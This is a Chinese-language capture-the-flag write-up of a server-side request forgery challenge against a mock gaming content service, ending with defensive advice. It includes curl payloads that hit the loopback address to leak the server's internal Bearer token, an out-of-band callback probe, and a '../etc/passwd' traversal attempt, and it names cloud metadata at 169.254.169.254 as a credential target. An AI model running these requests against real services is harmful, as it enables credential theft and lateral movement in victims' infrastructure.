# 06 · SSRF on Major Gaming Company —— 让服务器替我访问它的内网

> 系列第 6 题 · 对应真实事件：SSRF 触达内部云基础设施与敏感凭据（原赏金 $27,500，
> 九题中最高）· 我的净耗时：约 10 分钟

## 题面

> You've found a gaming company's content service that fetches resources from
> URLs you provide. But what happens when you point it somewhere the developers
> never intended - like the server's own internal network?
> Your mission: trick the server into making requests it shouldn't.

靶场地址：`https://<REDACTED_DOMAIN>/`（一个流媒体风格的"内容服务"）

## 我的判断路径

"服务端会抓取用户提供的 URL"是 SSRF 的题面标配。我的检测清单按成本排序：

1. 找到那个吃 URL 的参数（页面 JS 里的 API 调用通常写得很明白）
2. 先用正常值确认接口行为
3. 依次注入：完整 URL（环回地址）→ 外部回连地址（带外验证）→ 路径穿越（顺手测）
4. 观察服务端凭据是否随请求外泄——SSRF 的真正杀伤力在**内部凭据**，不在请求本身

## 过程

### 1. 定位参数

首页 JS 只有一个 API 调用：

```
/api/content/v2/module/{moduleId}/version/{version}/staged-files/{fileName}
```

先用正常值确认接口活着（返回 mock 文件内容的 JSON），然后进入注入。

### 2. fileName 吃下完整 URL：环回地址直通内网

我把 `fileName` 换成一个完整 URL——服务器**没有做任何协议或目标校验**，
直接替我请求了它的环回地址，并且把**它发出的请求头原样回显**：

```
GET /api/content/v2/module/1/version/1/staged-files/http://127.0.0.1/

→ {"headers_sent": {
     "Authorization": "Bearer <REDACTED_TOKEN>",
     "User-Agent": "InternalAPI/1.0.0"},
   "message": "Internal service response",
   "service": "localhost", "status": "success"}
```

那个 Bearer token 是服务端访问内部 API 用的凭据。解码 JWT payload（结构保留，
值脱敏）：

```json
{"sub": "content-service",
 "iss": "internal-auth",
 "iat": 1705312176, "exp": 1705398576,
 "scope": "internal:read internal:write",
 "service_id": "cs-001",
 "flag": "<REDACTED>"}
```

一个 `scope` 覆盖内部读写的服务身份凭据，外加 flag，一并到手。

### 3. 带外验证与对照实验

我又做了两组对照，把漏洞边界摸清楚：

- **带外验证**：让服务器去请求课程提供的回连检测域名（oast 类服务），
  返回 502 "returned unparseable JSON response"——错误信息证明**服务器确实发出了出网请求**，
  盲 SSRF 场景下这是标准的存在性证明
- **路径穿越**：`../etc/passwd` 被拦截（404），URL 编码变体会被反射回响应但不生效
  ——开发者**防住了路径穿越，却没防 URL 注入**，典型的"补了 A 漏了 B"

## 关键命令（脱敏后结构可复用）

```bash
BASE="https://<REDACTED_DOMAIN>/api/content/v2/module/1/version/1/staged-files"

curl "$BASE/test.json"                 # 正常行为基线
curl "$BASE/http://127.0.0.1/"         # 环回 SSRF → 回显内部请求头（含凭据）
curl "$BASE/http://<回连检测域名>/probe"  # 带外验证服务器侧确实发起请求
curl "$BASE/../etc/passwd"             # 对照：路径穿越已被防住
```

## 一个反直觉观察

这是九题中赏金最高的一道（$27,500），却只花了 10 分钟。**赏金标定的是危害深度，
不是发现难度**——SSRF 一旦能触达云元数据（`169.254.169.254`）拿临时凭据，
攻击者就能横向移动进整个云账号，所以厂商愿意为它付最高价。
找洞快慢和值多少钱，是两回事。

## 失败与弯路

无返工。唯一值得记的是顺序选择：先测环回地址而不是先测外网回连——
因为"环回 + 凭据回显"是最短路径直接拿结果，带外验证放在确认后补做。

## 防御视角（如果我是蓝队）

1. URL 类参数做**协议 + 目标白名单校验**：拒绝环回、内网段、链路本地地址
   （含 169.254.169.254 云元数据）、以及解析后落在这些范围的域名（防 DNS rebinding）
2. **绝不回显服务端请求头/响应细节**——本题的凭据泄露一半功劳在"回显"这个设计错误
3. 出网请求走独立的代理层，剥离内部凭据，内部调用与外部抓取使用不同身份
4. 内部服务凭据最小化：只读就别给 `internal:write`，并缩短有效期

## 证据

- `evidence/06-1-flag-submitted.png` —— 提交成功页面
